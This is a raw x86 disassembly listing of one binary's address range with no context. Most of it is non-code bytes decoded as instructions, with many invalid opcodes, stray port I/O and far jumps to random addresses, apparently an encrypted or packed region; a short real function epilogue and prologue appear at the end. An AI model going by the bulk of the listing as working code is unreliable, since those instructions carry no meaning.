  4145bf:	fsubr  st,st(5)
  4145c1:	in     eax,dx
  4145c2:	rol    eax,1
  4145c4:	in     al,dx
  4145c5:	fcomi  st,st(1)
  4145c7:	fld    QWORD PTR [edx]
  4145c9:	(bad)
  4145cc:	fcom   st(6)
  4145ce:	iret   
  4145cf:	loop   0x4145be
  4145d1:	(bad)  
  4145d2:	mov    esp,0xd2c9ecef
  4145d7:	mov    ch,0xf2
  4145d9:	lock fcmovnbe st,st(6)
  4145dc:	sti    
  4145dd:	mov    bh,0xb7
  4145df:	icebp  
  4145e0:	out    dx,al
  4145e1:	mov    edx,0xf6efeed8
  4145e6:	fcomp  st(0)
  4145e8:	rcr    edi,1
  4145ea:	(bad)  
  4145eb:	loop   0x4145e2
  4145ed:	dec    ebp
  4145ef:	loope  0x4145c0
  4145f1:	add    al,0xdd
  4145f3:	mov    cl,0xd0
  4145f5:	test   al,0xdc
  4145f7:	in     eax,0xdb
  4145f9:	fidiv  DWORD PTR [ecx-0x33214939]
  4145ff:	mov    ebp,0xe3d803f2
  414604:	(bad)  
  414606:	(bad)  
  414607:	out    0xd0,al
  414609:	add    eax,0x7c5d9d6
  41460e:	fld    QWORD PTR [eax+edi*8]
  414611:	int    0xc9
  414613:	in     al,0xa5
  414615:	loopne 0x4145e3
  414617:	lods   al,BYTE PTR ds:[esi]
  414618:	shl    DWORD PTR [edx-0x44454446],0xc8
  41461f:	mov    ebx,0xccf1c2cd
  414624:	add    esi,eax
  414626:	mov    ebx,0xf9c2e1d7
  41462b:	cli    
  41462c:	aad    0xf
  41462e:	fiadd  WORD PTR [edi]
  414630:	fadd   DWORD PTR ds:0xe4d6d7d8
  414636:	shr    cl,0xd1
  414639:	shr    edx,0xd7
  41463c:	cli    
  41463d:	(bad)  
  41463e:	mov    ebx,0xbbfef2d2
  414643:	int3   
  414644:	aad    0xf4
  414646:	ret    0x5c0
  414649:	(bad)  
  41464b:	out    dx,eax
  41464c:	loopne 0x414628
  41464e:	leave  
  41464f:	in     al,dx
  414650:	or     al,BYTE PTR [ebx]
  414652:	jmp    0x414620
  414654:	(bad)  
  414655:	shr    edi,cl
  414657:	div    eax
  414659:	in     al,0xd5
  41465b:	mov    ch,0xef
  41465d:	(bad)  
  41465f:	mov    esi,0xfbb8fdf7
  414664:	loope  0x414624
  414666:	cld    
  414667:	int3   
  414668:	cli    
  414669:	add    BYTE PTR [edi+0x7bce4f7],bh
  41466f:	add    bh,bl
  414671:	jmp    0xe6c8:0xf7f2e9c2
  414678:	iret   
  414679:	mov    dh,0xc4
  41467b:	imul   al
  41467d:	shr    ebp,cl
  41467f:	(bad)  
  414680:	fistp  QWORD PTR [esi+edx*8+0x1e5d501]
  414687:	add    ecx,ebx
  414689:	xlat   BYTE PTR ds:[ebx]
  41468a:	in     al,0xde
  41468c:	pop    es
  41468d:	enter  0xdfe9,0xca
  414691:	ffreep st(6)
  414693:	jmp    0xdaa9:0xace9d7cf
  41469a:	mov    dh,0xca
  41469c:	stc    
  41469d:	fcom   st(4)
  41469f:	mov    dl,0xd5
  4146a1:	idiv   BYTE PTR [ebp-0xffe1932]
  4146a7:	fdivr  st(2),st
  4146a9:	fnclex 
  4146ab:	aad    0xc1
  4146ad:	add    eax,0xe709e5cf
  4146b2:	int    0xe1
  4146b4:	in     eax,0xcf
  4146b6:	lods   eax,DWORD PTR ds:[esi]
  4146b7:	mov    dl,0xb6
  4146b9:	in     al,dx
  4146ba:	retf   0xd9b0
  4146bd:	sti    
  4146be:	in     al,0xd7
  4146c0:	retf   0xe3f2
  4146c3:	in     eax,dx
  4146c4:	loope  0x41467e
  4146c6:	sar    BYTE PTR [ebp-0x37263e1a],1
  4146cc:	loope  0x4146aa
  4146ce:	jecxz  0x4146cc
  4146d0:	out    dx,eax
  4146d1:	int    0xd3
  4146d3:	mov    edi,0xf2c7cfae
  4146d8:	icebp  
  4146d9:	jmp    0xfccc:0xd9e4f4c9
  4146e0:	fcmovnu st,st(7)
  4146e2:	repz aam 0xf7
  4146e5:	cmc    
  4146e6:	(bad)  
  4146e7:	in     eax,0xd5
  4146e9:	cmc    
  4146ea:	(bad)  [edi]
  4146ec:	(bad)  
  4146ee:	clc    
  4146ef:	or     ecx,esp
  4146f1:	fsubr  QWORD PTR [ebp-0x4a3c3b33]
  4146f7:	int3   
  4146f8:	retf   0xe1fa
  4146fb:	out    0xeb,al
  4146fd:	repnz cmc 
  4146ff:	out    dx,al
  414700:	int    0xc8
  414702:	cli    
  414703:	idiv   dh
  414705:	(bad)  
  414707:	std    
  414708:	cmc    
  414709:	add    esp,ebx
  41470b:	loope  0x414713
  41470d:	add    eax,esi
  41470f:	or     ah,ch
  414711:	push   cs
  414712:	test   al,0xb1
  414714:	loop   0x4146e5
  414716:	mov    bh,0xf2
  414718:	mov    al,0xd6
  41471a:	fdiv   st,st(6)
  41471c:	(bad)  
  41471d:	div    al
  41471f:	aam    0xf7
  414721:	not    dh
  414723:	hlt    
  414724:	sti    
  414725:	sti    
  414726:	call   edi
  414728:	loopne 0x41472a
  41472a:	add    edi,ebx
  41472c:	add    ah,bh
  41472e:	fisttp WORD PTR [ebx]
  414730:	add    al,0xd3
  414732:	loope  0x4146f7
  414734:	(bad)  
  414735:	into   
  414736:	in     eax,0xb3
  414738:	lods   eax,DWORD PTR ds:[esi]
  414739:	mov    ah,0xb7
  41473b:	icebp  
  41473c:	repnz sti 
  41473e:	xlat   BYTE PTR ds:[ebx]
  41473f:	mov    ebx,0xef02eae8
  414744:	(bad)  
  414745:	ffreep st(5)
  414747:	hlt    
  414748:	rol    eax,1
  41474a:	clc    
  41474b:	out    0x8,eax
  41474d:	or     bh,ah
  41474f:	hlt    
  414750:	fsubr  st,st(5)
  414752:	scas   al,BYTE PTR es:[edi]
  414753:	loopne 0x41472b
  414755:	out    0xc1,al
  414757:	mov    esp,0xf5cef2f1
  41475c:	div    dh
  41475e:	into   
  41475f:	jecxz  0x414712
  414761:	enter  0x7c9,0xf0
  414765:	sar    esi,cl
  414767:	loop   0x41475d
  414769:	aam    0xc7
  41476b:	call   0xc2454e56
  414770:	(bad)  
  414771:	stc    
  414772:	shr    BYTE PTR [ebp-0xf161d1c],cl
  414778:	mov    al,0xf5
  41477a:	mov    ecx,0xddb0cab1
  41477f:	rcl    eax,cl
  414781:	mov    esp,0x30300cf
  414786:	mov    ebx,0xf7c4f1f5
  41478b:	(bad)  
  41478c:	or     ah,dl
  41478e:	cmc    
  41478f:	ret    0xc00a
  414792:	in     al,dx
  414793:	out    dx,eax
  414794:	in     eax,dx
  414795:	icebp  
  414796:	loopne 0x41475b
  414798:	retf   0xedf6
  41479b:	out    dx,al
  41479c:	in     al,0xf0
  41479e:	sar    BYTE PTR [edi+edi*8-0x401f1734],1
  4147a5:	std    
  4147a6:	xlat   BYTE PTR ds:[ebx]
  4147a7:	add    edx,esi
  4147a9:	(bad)  
  4147aa:	jmp    0xcdcb:0xc50af6c8
  4147b1:	clc    
  4147b2:	mov    eax,0xd1e6c7b2
  4147b7:	in     al,dx
  4147b8:	jmp    0x4147b3
  4147ba:	out    dx,eax
  4147bb:	fcomip st,st(4)
  4147bd:	jmp    0x414787
  4147bf:	call   0xde3547ba
  4147c4:	lock shl ebp,1
  4147c7:	in     al,0xd4
  4147c9:	icebp  
  4147ca:	(bad)  
  4147cb:	fucom  st(6)
  4147cd:	test   bh,0xc
  4147d0:	fyl2x  
  4147d2:	rcl    dl,cl
  4147d4:	call   0xf11e2fd0
  4147d9:	lds    esi,FWORD PTR [ebp-0x16041030]
  4147df:	jmp    0xf83516ac
  4147e4:	out    0xf3,al
  4147e6:	sti    
  4147e7:	loopne 0x4147ca
  4147e9:	add    eax,0xd6e0fdc1
  4147ee:	cmc    
  4147ef:	push   es
  4147f0:	in     al,dx
  4147f1:	add    al,bh
  4147f3:	shr    DWORD PTR [ecx-0x131d5136],0xc7
  4147fa:	aad    0xff
  4147fc:	cmc    
  4147fd:	mov    edx,0xe8f0f8b5
  414802:	loopne 0x4147cc
  414804:	out    0xd0,al
  414806:	mov    ebp,0x9cb07c5
  41480b:	cmc    
  41480c:	std    
  41480d:	retf   0xe20c
  414810:	rcr    ebp,0xdc
  414813:	mov    dl,0xd6
  414815:	mov    cl,0xc8
  414817:	mov    bh,0xc7
  414819:	enter  0xc0f8,0xdb
  41481d:	mov    al,0xb6
  41481f:	leave  
  414820:	retf   0xe3d0
  414823:	mov    ecx,0xd606fbd4
  414828:	aad    0xc5
  41482a:	aam    0xfa
  41482c:	(bad)  
  41482d:	fdivp  st(6),st
  41482f:	ret    0xe302
  414832:	retf   0xacca
  414835:	(bad)  
  414837:	loopne 0x414819
  414839:	fneni(8087 only) 
  41483b:	iret   
  41483c:	out    0xe9,eax
  41483e:	std    
  41483f:	leave  
  414840:	mov    ch,0xb0
  414842:	int    0xf8
  414844:	fcmovne st,st(4)
  414846:	rcl    esp,0x2
  414849:	aad    0xc3
  41484b:	jmp    0x41482a
  41484d:	hlt    
  41484e:	fiadd  DWORD PTR [esi]
  414850:	cld    
  414851:	(bad)  
  414853:	mov    esi,0xc4e4afc3
  414858:	in     eax,0xe7
  41485a:	in     al,0xc9
  41485c:	aam    0xd8
  41485e:	fucom  st(4)
  414860:	shl    ecx,cl
  414862:	(bad)  
  414863:	std    
  414864:	imul   esi
  414866:	repz std 
  414868:	rol    edx,0xda
  41486b:	ret    0x80e
  41486e:	out    0xe1,al
  414870:	jmp    0x41484f
  414872:	lods   al,BYTE PTR ds:[esi]
  414873:	loop   0x41485b
  414875:	scas   eax,DWORD PTR es:[edi]
  414876:	bnd call 0xdc3d202e
  41487c:	in     eax,0xd3
  41487e:	into   
  41487f:	(bad)  
  414880:	sti    
  414881:	clc    
  414882:	in     eax,dx
  414883:	mov    eax,0x2010301
  414888:	out    0xb8,al
  41488a:	add    eax,0xe2eb0fd8
  41488f:	or     al,0xc5
  414891:	out    0xd3,eax
  414893:	in     al,dx
  414894:	mov    al,0xe5
  414896:	mov    bh,0xe2
  414898:	fidivr DWORD PTR [edx-0x4332606]
  41489e:	lock mov edi,0xf5ddc3f8
  4148a4:	shl    esp,cl
  4148a6:	rcr    esp,0x6
  4148a9:	add    ebx,esi
  4148ab:	loopne 0x414894
  4148ad:	jmp    0x102f4280
  4148b2:	jecxz  0x414861
  4148b4:	loop   0x4148a8
  4148b6:	repnz lods al,BYTE PTR ds:[esi]
  4148b8:	jmp    0xf6b8:0xcbb9f5e6
  4148bf:	sti    
  4148c0:	fdiv   st(6),st
  4148c2:	repz clc 
  4148c4:	in     al,dx
  4148c5:	mov    ah,0xc1
  4148c7:	faddp  st(4),st
  4148c9:	push   es
  4148ca:	fcomi  st,st(7)
  4148cc:	leave  
  4148cd:	jmp    0xe0ca:0x9e902fe
  4148d4:	loop   0x414886
  4148d6:	ror    bh,1
  4148d8:	test   eax,0xf0b7f9b7
  4148dd:	hlt    
  4148de:	(bad)  
  4148df:	push   edx
  4148e1:	ret    
  4148e2:	mov    eax,0xc702c3df
  4148e7:	jecxz  0x4148e7
  4148e9:	fadd   st(3),st
  4148eb:	cmc    
  4148ec:	leave  
  4148ed:	cli    
  4148ee:	retf   0xd0b
  4148f1:	retf   0xc3cd
  4148f4:	mov    al,0xad
  4148f6:	rol    edx,1
  4148f8:	in     eax,0xec
  4148fa:	div    ecx
  4148fc:	hlt    
  4148fd:	leave  
  4148fe:	(bad)  
  414900:	neg    ah
  414902:	icebp  
  414903:	(bad)  
  414904:	mov    edi,0x1bad8cc
  414909:	add    ebp,edi
  41490b:	lock loopne 0x4148ce
  41490e:	out    0xeb,al
  414910:	in     al,dx
  414911:	retf   0xe7ef
  414914:	repz enter 0xc8c0,0xf5
  414919:	aam    0xaf
  41491b:	aam    0xce
  41491d:	hlt    
  41491e:	mov    edx,0xe0fdf9d1
  414923:	xlat   BYTE PTR ds:[ebx]
  414924:	(bad)  
  414925:	(bad)  
  414927:	hlt    
  414928:	pop    es
  414929:	(bad)  
  41492a:	(bad)  
  41492b:	jmp    0x414936
  41492d:	hlt    
  41492e:	retf   
  41492f:	retf   0x30b
  414932:	enter  0xd7aa,0xf0
  414936:	out    0xce,al
  414938:	call   0xdb2235f4
  41493d:	(bad)  
  41493e:	dec    ah
  414940:	mov    ecx,0xedf4c1bc
  414945:	ret    
  414946:	ret    
  414947:	mov    esi,0xdd06fefb
  41494c:	add    eax,0xc8cdebdd
  414951:	or     eax,0xd6f7cfdf
  414956:	call   0xec221d40
  41495b:	(bad)  
  41495c:	ror    edx,1
  41495e:	into   
  41495f:	div    esp
  414961:	mov    esp,0xddc3f2e9
  414966:	rol    BYTE PTR [edx],0xc0
  414969:	fimul  WORD PTR [ebx]
  41496b:	lock out dx,eax
  41496d:	or     ecx,DWORD PTR [esi]
  41496f:	in     al,0xff
  414971:	out    dx,eax
  414972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414973:	lods   eax,DWORD PTR ds:[esi]
  414974:	shl    dl,cl
  414976:	hlt    
  414977:	ret    
  414978:	loopne 0x414948
  41497a:	int3   
  41497b:	imul   bl
  41497d:	leave  
  41497e:	int    0xba
  414980:	(bad)  
  414982:	hlt    
  414983:	fcmovbe st,st(0)
  414985:	mov    esi,0xd8dcf2fc
  41498a:	cli    
  41498b:	(bad)  
  41498c:	hlt    
  41498d:	add    al,0xe5
  41498f:	or     DWORD PTR [ecx],ecx
  414991:	push   es
  414992:	(bad)  
  414993:	jmp    0x41497e
  414995:	mov    ebp,0xc9c8e6d3
  41499a:	repnz retf 0xb9cc
  41499e:	test   esi,0xc2f8ecdb
  4149a4:	cld    
  4149a5:	shl    edx,1
  4149a7:	sti    
  4149a8:	loope  0x4149a0
  4149aa:	clc    
  4149ab:	(bad)  
  4149ad:	test   dl,0xde
  4149b0:	clc    
  4149b1:	add    esp,eax
  4149b3:	iret   
  4149b4:	mov    cl,0xbd
  4149b6:	out    0xd0,al
  4149b8:	loop   0x414984
  4149ba:	ror    cl,cl
  4149bc:	shl    eax,1
  4149be:	aad    0xf6
  4149c0:	hlt    
  4149c1:	enter  0xe800,0xbf
  4149c5:	out    0xf5,al
  4149c7:	(bad)  
  4149c9:	(bad)  
  4149ca:	fcmovu st,st(3)
  4149cc:	(bad)  
  4149cd:	out    dx,al
  4149ce:	(bad)  
  4149cf:	cld    
  4149d0:	adc    ch,ah
  4149d2:	mov    dl,0xf0
  4149d4:	fadd   st(0),st
  4149d6:	mov    bl,0xf7
  4149d8:	sar    ebx,0xb6
  4149db:	bnd call 0xbcf621cd
  4149e1:	jmp    0xdf120ca1
  4149e6:	repz (bad) 
  4149e9:	(bad)
  4149ec:	bswap  esi
  4149ee:	in     al,0xf
  4149f0:	pop    es
  4149f1:	int3   
  4149f2:	ffreep st(6)
  4149f4:	jmp    0xcb02f8af
  4149f9:	mov    ebx,0xd3f8b8d8
  4149fe:	hlt    
  4149ff:	fucomp st(5)
  414a01:	cld    
  414a02:	idiv   esi
  414a04:	loopne 0x4149df
  414a06:	jecxz  0x414a0d
  414a08:	(bad)  
  414a09:	in     eax,0xe9
  414a0b:	in     eax,0x8
  414a0d:	hlt    
  414a0e:	stc    
  414a0f:	push   es
  414a10:	jmp    0xd4cf:0xd3ebe3e2
  414a17:	int    0xb2
  414a19:	in     al,0xd8
  414a1b:	inc    esp
  414a1d:	ror    ch,1
  414a1f:	shr    edi,cl
  414a21:	ror    ebp,1
  414a23:	icebp  
  414a24:	mov    eax,0xf8f006f1
  414a29:	loopne 0x414a11
  414a2b:	mul    ebx
  414a2d:	or     eax,0xe700cafb
  414a32:	jmp    0x414a2b
  414a34:	out    0xe6,eax
  414a36:	mov    ch,0xb5
  414a38:	(bad)  
  414a39:	repnz out 0xb6,al
  414a3c:	mov    edi,0xcfd8d7f8
  414a41:	iret   
  414a42:	enter  0xd0ef,0xc1
  414a46:	rcl    ebp,0xe7
  414a49:	jmp    0xdc09:0xfcdcf0e0
  414a50:	(bad)  
  414a53:	(bad)  
  414a54:	mov    dl,0xc3
  414a56:	loopne 0x414a4e
  414a58:	mov    ebx,0xb8e9ece0
  414a5d:	mov    al,0xda
  414a5f:	int3   
  414a60:	int3   
  414a61:	sti    
  414a62:	add    DWORD PTR [esi+0x4f5dff2],edi
  414a68:	(bad)  
  414a6a:	fcmove st,st(1)
  414a6c:	or     dh,al
  414a6e:	into   
  414a6f:	(bad)  
  414a70:	or     al,0xef
  414a72:	mov    bl,0xe2
  414a74:	xlat   BYTE PTR ds:[ebx]
  414a75:	mov    al,0xc3
  414a77:	jmp    0xec021961
  414a7c:	icebp  
  414a7d:	cmc    
  414a7e:	fdivr  DWORD PTR [ebx-0x4232c12]
  414a84:	add    ecx,esi
  414a86:	(bad)  
  414a87:	ffree  st(3)
  414a89:	(bad)  
  414a8a:	cmc    
  414a8b:	cmc    
  414a8c:	leave  
  414a8d:	enter  0x90d,0xe
  414a91:	rcr    al,cl
  414a93:	lods   eax,DWORD PTR ds:[esi]
  414a94:	int3   
  414a95:	(bad)  
  414a96:	mov    cl,0xf1
  414a98:	repnz in al,dx
  414a9a:	div    DWORD PTR [ebp+ecx*8+0x3e9f8b6]
  414aa1:	add    ch,ch
  414aa3:	(bad)  
  414aa4:	idiv   esi
  414aa6:	cli    
  414aa7:	(bad)  
  414aa9:	add    eax,0xc6ee0ac5
  414aae:	loopne 0x414a79
  414ab0:	repz jmp 0xe8f1:0xbcafe7e0
  414ab8:	out    dx,al
  414ab9:	mov    ah,0xe5
  414abb:	mov    ch,0xdf
  414abd:	out    dx,al
  414abe:	into   
  414abf:	repz jmp 0xf2d2:0xe2b80203
  414ac7:	repnz rcr bh,0x9
  414acb:	clc    
  414acc:	shr    bh,0xf
  414acf:	cld    
  414ad0:	retf   
  414ad1:	icebp  
  414ad2:	mov    edi,0xd7eee3ea
  414ad7:	mov    bh,0xb6
  414ad9:	fidiv  DWORD PTR [edx-0x292d3905]
  414adf:	int    0xd8
  414ae1:	icebp  
  414ae2:	mov    edi,0xc2e2d3b9
  414ae7:	clc    
  414ae8:	in     eax,0xff
  414aea:	or     eax,eax
  414aec:	fdivp  st(3),st
  414aee:	loopne 0x414ada
  414af0:	cli    
  414af1:	add    ebx,esp
  414af3:	mov    cl,0xce
  414af5:	scas   eax,DWORD PTR es:[edi]
  414af6:	out    dx,eax
  414af7:	loopne 0x414adf
  414af9:	aam    0xf3
  414afb:	out    0xf9,eax
  414afd:	mov    dh,0xe4
  414aff:	jmp    0xecbc:0xbf00f5f3
  414b06:	cld    
  414b07:	(bad)  
  414b09:	icebp  
  414b0a:	leave  
  414b0b:	(bad)
  414b0e:	retf   0xde01
  414b11:	cli    
  414b12:	into   
  414b13:	rcl    edi,cl
  414b15:	(bad)  
  414b16:	shl    dh,cl
  414b18:	in     al,dx
  414b19:	test   al,0xb0
  414b1b:	(bad)  
  414b1c:	int3   
  414b1d:	jmp    0xd2dc:0xfcd2dff1
  414b24:	mov    esi,0xdcc5c1c6
  414b29:	ret    
  414b2a:	fiadd  DWORD PTR [edi]
  414b2c:	or     edx,ecx
  414b2e:	jmp    0x414b37
  414b30:	leave  
  414b31:	pop    es
  414b32:	fxch   st(1)
  414b34:	shl    dl,cl
  414b36:	leave  
  414b37:	in     eax,0xfa
  414b39:	fidiv  DWORD PTR [esi-0x3206490c]
  414b3f:	int3   
  414b40:	stc    
  414b41:	aam    0xdf
  414b43:	shl    edi,cl
  414b45:	in     eax,0xbd
  414b47:	in     al,dx
  414b48:	aad    0xd7
  414b4a:	jmp    0xfbf8:0xc3cee2c6
  414b51:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b53:	in     eax,0xcc
  414b55:	cmc    
  414b56:	icebp  
  414b57:	in     eax,dx
  414b58:	int3   
  414b59:	rcl    dh,1
  414b5b:	mov    ah,0xf8
  414b5d:	fxam   
  414b5f:	jmp    0xb73d045b
  414b64:	cli    
  414b65:	int    0xde
  414b67:	loopne 0x414b26
  414b69:	loopne 0x414b2b
  414b6b:	add    eax,0xf9fa0b05
  414b70:	add    al,0xe8
  414b72:	fsub   st(7),st
  414b74:	mov    bl,0xe6
  414b76:	jmp    0xd9cd:0xb0f3dbdc
  414b7d:	icebp  
  414b7e:	enter  0xedf3,0xff
  414b82:	jecxz  0x414b5b
  414b84:	iret   
  414b85:	(bad)  
  414b87:	xlat   BYTE PTR ds:[ebx]
  414b88:	test   DWORD PTR [ecx],0xb0fd7fa
  414b8e:	(bad)  
  414b8f:	cld    
  414b90:	adc    al,BYTE PTR [ecx]
  414b92:	(bad)  
  414b94:	jecxz  0x414b65
  414b96:	shl    ah,0xc9
  414b99:	jmp    0xf5391672
  414b9e:	jmp    0x414b69
  414ba0:	mov    esi,0xed07f3fa
  414ba5:	cld    
  414ba6:	add    BYTE PTR [esi-0x243a2af6],bh
  414bac:	add    eax,0xbf90dc5
  414bb1:	or     ebx,esp
  414bb3:	in     al,0xea
  414bb5:	mov    dh,0xc4
  414bb7:	mov    bh,0xca
  414bb9:	sar    edx,1
  414bbb:	shl    DWORD PTR [esi-0x27281323],1
  414bc1:	add    edx,eax
  414bc3:	sar    bl,1
  414bc5:	(bad)  
  414bc6:	(bad)  
  414bc8:	pop    es
  414bc9:	shl    ah,1
  414bcb:	jecxz  0x414ba1
  414bcd:	(bad)  
  414bce:	in     al,0xe9
  414bd0:	repnz add ecx,esi
  414bd3:	in     al,dx
  414bd4:	out    0xbe,eax
  414bd6:	xlat   BYTE PTR ds:[ebx]
  414bd7:	aad    0xc8
  414bd9:	mov    ch,0xc1
  414bdb:	enter  0xc9ed,0xfc
  414bdf:	(bad)  
  414be1:	mov    ecx,0xf9ccbdd4
  414be6:	loope  0x414ba5
  414be8:	icebp  
  414be9:	cmc    
  414bea:	(bad)  
  414beb:	dec    BYTE PTR [edx]
  414bed:	add    al,0xdd
  414bef:	fsincos 
  414bf1:	shr    dl,cl
  414bf3:	in     al,dx
  414bf4:	iret   
  414bf5:	iret   
  414bf6:	out    0xcc,eax
  414bf8:	(bad)  
  414bf9:	xlat   BYTE PTR ds:[ebx]
  414bfa:	mov    dl,0xfa
  414bfc:	(bad)  
  414bfd:	(bad)
  414c00:	(bad)  
  414c02:	stc    
  414c03:	aad    0xfe
  414c05:	loopne 0x414bce
  414c07:	std    
  414c08:	add    al,0xe4
  414c0a:	jecxz  0x414c0d
  414c0c:	jmp    0xe40f2117
  414c11:	fmul   st(7),st
  414c13:	test   eax,0xb3f7b6f0
  414c18:	shl    DWORD PTR [esi+edx*8-0x254f0647],1
  414c1f:	int    0x3
  414c21:	ror    ebp,cl
  414c23:	xlat   BYTE PTR ds:[ebx]
  414c24:	cli    
  414c25:	(bad)  
  414c26:	in     eax,dx
  414c27:	std    
  414c28:	(bad)  
  414c29:	jmp    0x414c2e
  414c2b:	jecxz  0x414bed
  414c2d:	iret   
  414c2e:	jecxz  0x414c3d
  414c30:	leave  
  414c31:	in     al,0xac
  414c33:	into   
  414c34:	mov    bl,0xcf
  414c36:	shr    BYTE PTR [ebp-0x46181e1f],0xd0
  414c3d:	mov    bh,0xd7
  414c3f:	lock out dx,eax
  414c41:	mov    esp,0xbfd8dfdd
  414c46:	loop   0x414c02
  414c48:	sti    
  414c49:	loope  0x414c26
  414c4b:	std    
  414c4c:	add    ebx,esp
  414c4e:	stc    
  414c4f:	loope  0x414c34
  414c51:	cli    
  414c52:	mov    edi,0xd5d1acd7
  414c58:	repnz mov dh,0xed
  414c5b:	int3   
  414c5c:	lods   eax,DWORD PTR ds:[esi]
  414c5d:	sti    
  414c5e:	lock (bad) 
  414c60:	fmul   st,st(0)
  414c62:	std    
  414c63:	hlt    
  414c64:	mov    esi,0xd6fddadd
  414c69:	add    edi,ebx
  414c6b:	sti    
  414c6c:	loop   0x414c3d
  414c6e:	aam    0x6
  414c70:	add    bl,dl
  414c72:	test   eax,0xe6e7bcaf
  414c77:	ret    0xc5c2
  414c7a:	in     eax,0xc4
  414c7c:	jmp    0xe43d4959
  414c81:	(bad)  
  414c82:	out    dx,al
  414c83:	xlat   BYTE PTR ds:[ebx]
  414c84:	std    
  414c85:	(bad)  
  414c86:	xlat   BYTE PTR ds:[ebx]
  414c87:	int3   
  414c88:	(bad)  
  414c8a:	fild   DWORD PTR [ebx]
  414c8c:	add    bl,ch
  414c8e:	in     al,0xfd
  414c90:	or     BYTE PTR [edi],al
  414c92:	lods   al,BYTE PTR ds:[esi]
  414c93:	lock lock jmp 0xb42d0f61
  414c9a:	shr    al,1
  414c9c:	in     eax,dx
  414c9d:	out    0xf8,al
  414c9f:	mov    ebx,0xb9c9c8f2
  414ca4:	imul   esp
  414ca6:	cli    
  414ca7:	clc    
  414ca8:	or     dh,ah
  414caa:	(bad)  
  414cab:	(bad)  
  414cad:	clc    
  414cae:	out    0xe6,al
  414cb0:	pslld  mm1,mm0
  414cb3:	mov    esi,0xf6edb2dd
  414cb8:	(bad)  
  414cb9:	int3   
  414cba:	aad    0xc4
  414cbc:	sti    
  414cbd:	into   
  414cbe:	aad    0xde
  414cc0:	cmc    
  414cc1:	idiv   DWORD PTR [ebp-0x4338fc34]
  414cc7:	or     edx,ebp
  414cc9:	neg    ebp
  414ccb:	inc    BYTE PTR [eax]
  414ccd:	out    dx,al
  414cce:	enter  0xed02,0xce
  414cd2:	scas   al,BYTE PTR es:[edi]
  414cd3:	into   
  414cd4:	mov    dl,0xe8
  414cd6:	retf   0xcffb
  414cd9:	in     eax,0xc4
  414cdb:	fidivr DWORD PTR [ecx-0x33410e31]
  414ce1:	in     al,dx
  414ce2:	ret    
  414ce3:	add    ch,bh
  414ce5:	int3   
  414ce6:	sar    ebx,0xdc
  414ce9:	add    bh,BYTE PTR [edi-0x20923f9]
  414cef:	(bad)  
  414cf0:	std    
  414cf1:	add    bh,bl
  414cf3:	stos   BYTE PTR es:[edi],al
  414cf4:	(bad)  
  414cf5:	mov    al,0xee
  414cf8:	leave  
  414cf9:	out    dx,al
  414cfa:	(bad)  
  414cfb:	(bad)  
  414cfc:	in     eax,dx
  414cfd:	test   bh,0xb6
  414d00:	fcmovnu st,st(5)
  414d02:	xlat   BYTE PTR ds:[ebx]
  414d03:	ret    0xd0ec
  414d06:	ret    0xf3ec
  414d09:	inc    ebp
  414d0b:	mov    esi,0xe1e4fce7
  414d10:	enter  0xe3fd,0xdf
  414d14:	ret    
  414d15:	imul   cl
  414d17:	call   0xc61032f2
  414d1c:	fidiv  DWORD PTR [esi-0x17310738]
  414d22:	(bad)  
  414d23:	out    dx,al
  414d24:	ret    0xe3c3
  414d27:	(bad)  
  414d28:	fld    DWORD PTR [esp+esi*8]
  414d2b:	fmul   DWORD PTR [esi]
  414d2d:	or     bh,dl
  414d2f:	jmp    0xbe051647
  414d34:	scas   al,BYTE PTR es:[edi]
  414d35:	loopne 0x414cfa
  414d37:	jmp    0xf31c01e8
  414d3c:	out    0xfd,eax
  414d3e:	into   
  414d3f:	neg    ebx
  414d41:	(bad)  
  414d42:	aam    0xd6
  414d44:	frndint 
  414d46:	shr    esp,1
  414d48:	(bad)  
  414d49:	lock add cl,ch
  414d4c:	call   0xc9313c3a
  414d51:	clc    
  414d52:	mov    esi,0xcfccd1e0
  414d57:	into   
  414d58:	(bad)
  414d5b:	sti    
  414d5c:	jmp    0x414d58
  414d5e:	jmp    0xb91d2936
  414d63:	sti    
  414d64:	inc    BYTE PTR [edi]
  414d66:	mov    edi,0xc7f7c105
  414d6b:	in     al,0x1
  414d6d:	call   0xf231476d
  414d72:	mov    eax,0xd0c6e0d3
  414d77:	mov    dh,0xcd
  414d79:	in     al,0xcb
  414d7b:	into   
  414d7c:	mov    ah,0xee
  414d7e:	aam    0xfb
  414d80:	aam    0xce
  414d82:	std    
  414d83:	in     eax,dx
  414d84:	cld    
  414d85:	cli    
  414d86:	mov    edi,0xbff901f0
  414d8b:	(bad)  
  414d8d:	iret   
  414d8e:	jmp    0x414d52
  414d90:	or     ah,al
  414d92:	mov    cl,0xf1
  414d94:	(bad)
  414d98:	(bad)  
  414d99:	call   0xb60f3e98
  414d9e:	div    cl
  414da0:	retf   
  414da1:	(bad)  
  414da3:	mov    dh,0xd4
  414da5:	jecxz  0x414d7a
  414da7:	mov    DWORD PTR [ecx],0xe9cbf706
  414dad:	(bad)  
  414daf:	push   es
  414db0:	or     cl,cl
  414db2:	fsubr  st,st(7)
  414db4:	mov    esi,0xcde5c0c6
  414db9:	mov    ah,0xe0
  414dbb:	scas   al,BYTE PTR es:[edi]
  414dbc:	idiv   eax
  414dbe:	test   BYTE PTR [ebx],0xec
  414dc1:	sti    
  414dc2:	jecxz  0x414db3
  414dc4:	add    cl,bl
  414dc6:	add    eax,esp
  414dc8:	xlat   BYTE PTR ds:[ebx]
  414dc9:	(bad)  
  414dca:	(bad)  
  414dcb:	xor    ebx,ebx
  414dcd:	mov    edx,esp
  414dcf:	dec    edx
  414dd0:	inc    ebx
  414dd1:	add    ebx,DWORD PTR [edx+ebx*1]
  414dd4:	dec    ebx
  414dd5:	xor    edx,edx
  414dd7:	add    DWORD PTR [ebp-0x1c],ebx
  414dda:	pop    ebx
  414ddb:	mov    eax,DWORD PTR [ebp-0x1c]
  414dde:	pop    esi
  414ddf:	pop    ebx
  414de0:	leave  
  414de1:	ret    0x10
  414de4:	push   ebp
  414de5:	mov    ebp,esp
  414de7:	sub    esp,0x64
  414dea:	sub    DWORD PTR ds:0x43776f,ecx
  414df0:	mov    DWORD PTR [ebp-0x8],0xf89f85b0
  414df7:	lea    eax,[ebp+0x14]
  414dfa:	xor    ecx,DWORD PTR ds:0x437737
  414e00:	mov    DWORD PTR [ebp-0x14],eax
  414e03:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  414e0a:	mov    DWORD PTR ds:0x4377b7,0x16
